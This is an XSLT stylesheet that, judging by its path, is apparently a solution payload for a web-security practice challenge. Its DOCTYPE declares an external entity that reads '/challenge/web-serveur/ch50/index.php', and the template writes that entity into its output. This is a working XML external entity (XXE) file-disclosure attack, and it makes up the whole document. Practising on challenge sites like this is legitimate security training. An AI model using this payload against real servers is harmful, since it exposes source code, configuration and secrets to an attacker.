<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/challenge/web-serveur/ch50/index.php">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/events">
    Events &ext_file;:
    <xsl:for-each select="event">
      <xsl:value-of select="name"/>: <xsl:value-of select="value"/>
    </xsl:for-each>
  </xsl:template>

</xsl:stylesheet>
